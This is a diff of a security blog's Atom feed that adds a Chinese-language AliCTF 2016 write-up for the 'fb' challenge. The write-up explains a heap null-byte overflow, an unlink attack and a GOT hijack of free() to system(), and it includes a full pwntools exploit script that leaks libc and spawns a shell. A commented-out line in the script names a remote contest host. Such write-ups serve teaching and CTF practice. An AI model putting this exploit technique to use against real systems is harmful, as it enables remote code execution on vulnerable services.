@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://a7vinx.github.io/"/>
-  <updated>2016-10-29T15:39:36.156Z</updated>
+  <updated>2016-11-01T12:18:38.356Z</updated>
   <id>http://a7vinx.github.io/</id>
   
   <author>
@@ -16,11 +16,41 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>AliCTF 2016 fb writeup</title>
+    <link href="http://a7vinx.github.io/2016/06/07/alictf_2016_fb_writeup/"/>
+    <id>http://a7vinx.github.io/2016/06/07/alictf_2016_fb_writeup/</id>
+    <published>2016-06-07T12:33:00.000Z</published>
+    <updated>2016-11-01T12:18:38.356Z</updated>
+    
+    <content type="html"><![CDATA[<p>一道堆中的null byte溢出题</p>
+<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>
+<a id="more"></a>
+<p>由于读取输入的时候会在最后再添加’\x00’：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:00000000004008E4                 cdqe</div><div class="line">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class="line">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class="line">.text:00000000004008EE                 add     rax, rdx</div><div class="line">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class="line">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class="line">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>
+<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>
+<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CANARY    : ENABLED</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div></pre></td></tr></table></figure>
+<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>
+<p>然后泄漏出来算下偏移就可以调用system()了</p>
+<p>Exploit:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">io=process(&apos;./fb&apos;)</div><div class="line"># io = remote(&quot;114.55.103.213&quot;,9733)</div><div class="line"></div><div class="line">SIZE=0xf8</div><div class="line">PLT_puts=0x4006C0</div><div class="line">GOT_free=0x602018</div><div class="line">GOT_read=0x602040</div><div class="line">FD=0x6020C8</div><div class="line">BK=0x6020D0</div><div class="line"></div><div class="line">def init(size):</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;1&apos;)</div><div class="line">	io.recvuntil(&apos;length:&apos;)</div><div class="line">	io.sendline(str(size))</div><div class="line">	io.recvuntil(&apos;Done~&apos;)</div><div class="line"></div><div class="line">def edit(index,content):</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;2&apos;)</div><div class="line">	io.recvuntil(&apos;index:&apos;)</div><div class="line">	io.sendline(str(index))</div><div class="line">	io.recvuntil(&apos;content:&apos;)</div><div class="line">	io.sendline(str(content))</div><div class="line">	io.recvuntil(&apos;Done~&apos;)</div><div class="line"></div><div class="line">def delete(index):</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;3&apos;)</div><div class="line">	io.recvuntil(&apos;index:&apos;)</div><div class="line">	io.sendline(str(index))</div><div class="line">	io.recvuntil(&apos;Done~&apos;)</div><div class="line"></div><div class="line">def leak(dst):</div><div class="line">	edit(1,p64(dst)+p64(SIZE)[:-1])</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;3&apos;)</div><div class="line">	io.recvuntil(&apos;index:&apos;)</div><div class="line">	io.sendline(&apos;0&apos;)</div><div class="line">	leakmem = io.recvuntil(&quot;Done~&quot;)[:-6]</div><div class="line">	return str(leakmem)</div><div class="line"></div><div class="line">def main():</div><div class="line"></div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line">	init(SIZE)</div><div class="line"></div><div class="line">	payload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+&apos;A&apos;*0xd0+p64(0xf0)</div><div class="line">	# overflow null byte</div><div class="line">	edit(2,payload)</div><div class="line">        # gdb.attach(io,execute=(&quot;b *%s&quot;%(0x400CCF)))</div><div class="line">	delete(3)</div><div class="line">        </div><div class="line">	payload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class="line">	edit(2,payload2)</div><div class="line"></div><div class="line">	# modify GOT entry of free to PLT entry of puts</div><div class="line">	# use [:1] to prevent \x00 from causing damage</div><div class="line">	edit(2,p64(PLT_puts)[:-1])</div><div class="line"></div><div class="line">	# leak read_addr</div><div class="line">	read_addr=u64(leak(GOT_read).ljust(8,&apos;\x00&apos;))</div><div class="line">	print &quot;read_addr: &quot;+str(hex(read_addr))</div><div class="line"></div><div class="line"></div><div class="line">	system_addr=read_addr-0x980C0</div><div class="line">	# system_addr= read_addr-0xeb6a0 +0x46590</div><div class="line">	</div><div class="line">	# modify free to system</div><div class="line">	edit(2,p64(system_addr)[:-1])</div><div class="line">	edit(4,&quot;/bin/sh&quot;)</div><div class="line">	</div><div class="line">	# now get shell</div><div class="line">	io.recvuntil(&apos;Choice:&apos;)</div><div class="line">	io.sendline(&apos;3&apos;)</div><div class="line">	io.recvuntil(&apos;index:&apos;)</div><div class="line">	io.sendline(&apos;4&apos;)</div><div class="line"></div><div class="line">	io.interactive()</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;一道堆中的null byte溢出题&lt;/p&gt;
+&lt;p&gt;程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存&lt;/p&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>Linux下Glibc 堆的malloc及free过程分析</title>
-    <link href="http://a7vinx.github.io/2016/10/29/linux_heap_analysis/"/>
-    <id>http://a7vinx.github.io/2016/10/29/linux_heap_analysis/</id>
-    <published>2016-10-29T15:39:36.168Z</published>
-    <updated>2016-10-29T15:39:36.156Z</updated>
+    <link href="http://a7vinx.github.io/2016/05/29/linux_heap_analysis/"/>
+    <id>http://a7vinx.github.io/2016/05/29/linux_heap_analysis/</id>
+    <published>2016-05-29T13:03:00.000Z</published>
+    <updated>2016-11-01T12:18:38.440Z</updated>
     
     <content type="html"><![CDATA[<p>想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了<a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="external">这篇分析</a>之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。</p>
 <a id="more"></a>
